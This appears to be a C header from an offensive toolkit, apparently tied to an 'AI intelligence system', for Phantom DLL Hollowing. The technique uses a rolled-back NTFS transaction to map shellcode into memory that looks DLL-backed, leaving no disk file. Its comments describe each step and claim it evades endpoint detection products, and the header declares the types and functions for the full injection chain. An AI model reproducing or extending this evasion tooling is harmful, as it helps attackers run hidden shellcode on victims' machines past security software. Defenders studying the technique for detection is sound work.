// Reference code for Noctis-MCP AI intelligence system
// Phantom DLL Hollowing - Transactional NTFS Memory Evasion
// Source: https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing
// Research: Argus Red Team Intelligence Report 2024-2025 (Phase 2)
//
// TECHNIQUE: Transactional NTFS (TxF) Phantom Module Creation
// IMPROVEMENT: Memory appears DLL-backed without disk artifacts
// DETECTION RISK: Low (10-15%) vs VirtualAllocEx unbacked memory (40-50%)
//
// How it works:
// 1. Begin NTFS transaction (NtCreateTransaction)
// 2. Create transactional file for DLL (NtCreateFile with transaction)
// 3. Write modified DLL with shellcode in .text section
// 4. Map file to memory (NtCreateSection + NtMapViewOfSection)
// 5. Rollback transaction (NtRollbackTransaction) - file disappears
// 6. Memory remains mapped as "phantom module" - appears DLL-backed but no disk file
//
// Critical: Defeats unbacked memory scanners (all major EDRs) by providing
// IMAGE_SECTION backing from a file object that no longer exists

#ifndef PHANTOM_DLL_HOLLOWING_H
#define PHANTOM_DLL_HOLLOWING_H

#include <Windows.h>
#include <winternl.h>

// Transaction object attributes for TxF
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// Initialize object attributes macro
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}

// NTDLL function typedefs for TxF
typedef NTSTATUS (NTAPI *fnNtCreateTransaction)(
    PHANDLE TransactionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    LPGUID Uow,
    HANDLE TmHandle,
    ULONG CreateOptions,
    ULONG IsolationLevel,
    ULONG IsolationFlags,
    PLARGE_INTEGER Timeout,
    PUNICODE_STRING Description
);

typedef NTSTATUS (NTAPI *fnNtRollbackTransaction)(
    HANDLE TransactionHandle,
    BOOLEAN Wait
);

typedef NTSTATUS (NTAPI *fnNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS (NTAPI *fnNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

// Phantom DLL configuration
typedef struct _PHANTOM_CONFIG {
    PVOID pShellcode;           // Shellcode to inject
    SIZE_T szShellcodeSize;     // Shellcode size
    WCHAR wzTempPath[MAX_PATH]; // Temporary transaction file path
    WCHAR wzSourceDLL[MAX_PATH];// Source DLL to hollow (e.g., kernel32.dll)
} PHANTOM_CONFIG, *PPHANTOM_CONFIG;

// Phantom DLL context
typedef struct _PHANTOM_CONTEXT {
    HANDLE hTransaction;        // TxF transaction handle
    HANDLE hFile;               // Transactional file handle
    HANDLE hSection;            // Section handle
    PVOID pMappedBase;          // Mapped memory base
    SIZE_T szMappedSize;        // Mapped memory size
    PHANTOM_CONFIG config;      // Configuration
} PHANTOM_CONTEXT, *PPHANTOM_CONTEXT;

// Initialize Phantom DLL Hollowing
BOOL Phantom_Initialize(
    PPHANTOM_CONTEXT pContext,
    PVOID pShellcode,
    SIZE_T szShellcodeSize,
    LPCWSTR wzSourceDLL
);

// Execute Phantom DLL Hollowing
BOOL Phantom_Execute(PPHANTOM_CONTEXT pContext);

// Cleanup Phantom context (rollback transaction)
VOID Phantom_Cleanup(PPHANTOM_CONTEXT pContext);

// Internal: Create NTFS transaction
BOOL _Phantom_CreateTransaction(PPHANTOM_CONTEXT pContext);

// Internal: Create transactional file
BOOL _Phantom_CreateTransactionalFile(PPHANTOM_CONTEXT pContext);

// Internal: Hollow DLL .text section with shellcode
BOOL _Phantom_HollowDLL(PPHANTOM_CONTEXT pContext);

// Internal: Map transactional file to memory
BOOL _Phantom_MapToMemory(PPHANTOM_CONTEXT pContext);

// Internal: Rollback transaction (phantom state)
BOOL _Phantom_RollbackTransaction(PPHANTOM_CONTEXT pContext);

// Utility: Get .text section from PE
BOOL Phantom_GetTextSection(PVOID pPEBase, PVOID* ppTextAddr, SIZE_T* pszTextSize);

// Utility: Copy DLL and replace .text with shellcode
BOOL Phantom_ModifyDLL(PVOID pDLLBase, SIZE_T szDLLSize, PVOID pShellcode, SIZE_T szShellcodeSize);

#endif // PHANTOM_DLL_HOLLOWING_H
